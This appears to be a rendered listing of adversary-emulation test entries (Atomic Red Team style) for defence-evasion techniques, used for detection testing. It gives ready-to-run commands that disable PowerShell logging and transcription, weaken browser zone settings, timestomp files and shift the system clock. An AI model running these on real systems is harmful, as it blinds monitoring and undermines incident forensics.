<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 95b25212-91a7-42ff-9613-124aca6845a8</li>
<li><strong>name</strong>: Windows Powershell Logging Disabled</li>
<li>
<p><strong>description</strong>: Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution
see https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.PowerShell::EnableModuleLogging</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /f &gt;nul 2&gt;&amp;1
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /f &gt;nul 2&gt;&amp;1
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /f &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1112</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b1a4d687-ba52-4057-81ab-757c3dc0d3b5</li>
<li><strong>name</strong>: Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell</li>
<li><strong>description</strong>: This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. 
To verify the effects of the test:</li>
<li>Open the Registry Editor (regedit.exe).</li>
<li>Navigate to "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults".</li>
<li>
<p>Check for the presence of the "http" and "https" DWORD values set to <code>0</code>.
Or run:
<code>powershell
Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' | Select-Object http,https</code></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: # Set the registry values for http and https to 0
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 0
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 0</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: # Restore the registry values for http and https to 3
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 3
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 3</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1112</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c</li>
<li><strong>name</strong>: Windows - Modify file creation timestamp with PowerShell</li>
<li>
<p><strong>description</strong>: Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.
To verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-ChildItem "#{file_path}" | % { $_.CreationTime = "#{target_date_time}" }</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{file_path}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Path "#{file_path}" -Force | Out-Null
Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1070.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: {'description': 'Path of file to change creation timestamp', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt'}</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f8f6634d-93e1-4238-8510-f8a90a20dcf2</li>
<li><strong>name</strong>: Windows - Modify file last modified timestamp with PowerShell</li>
<li>
<p><strong>description</strong>: Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.
To verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-ChildItem "#{file_path}" | % { $_.LastWriteTime = "#{target_date_time}" }</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{file_path}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Path "#{file_path}" -Force | Out-Null
Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1070.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: {'description': 'Path of file to change modified timestamp', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt'}</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: da627f63-b9bd-4431-b6f8-c5b44d061a62</li>
<li><strong>name</strong>: Windows - Modify file last access timestamp with PowerShell</li>
<li>
<p><strong>description</strong>: Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.
To verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-ChildItem "#{file_path}" | % { $_.LastAccessTime = "#{target_date_time}" }</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{file_path}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Path "#{file_path}" -Force | Out-Null
Set-Content "#{file_path}" -Value "T1551.006 Timestomp" -Force | Out-Null</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1070.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: {'description': 'Path of file to change last access timestamp', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\T1551.006_timestomp.txt'}</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7bcf83bf-f5ef-425c-9d9a-71618ad9ed12</li>
<li><strong>name</strong>: Event Log Manipulations- Time slipping via Powershell</li>
<li><strong>description</strong>: Changes the system time on the computer to a time that you specify. It involves altering the system’s clock or adjusting the dates of files, affecting timestamp integrity within Event Logs. This technique can disrupt the sequence of logged events, complicating incident analysis and forensics. 
Reference - 
https://detect.fyi/event-log-manipulations-1-time-slipping-55bf95631c40
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-date?view=powershell-7.4</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: try{ 
  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})
  Add-Content "$env:APPDATA\slipDays.bak" #{days_to_modify}
}
catch {exit 1}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: if(Test-Path "$env:APPDATA\slipDays.bak" ){
  foreach($line in (get-content $env:APPDATA\slipDays.bak)){
    Set-Date -Date (Get-Date).AddDays(-$line)
  }
  rm "$env:APPDATA\slipDays.bak"
}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1070.006</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
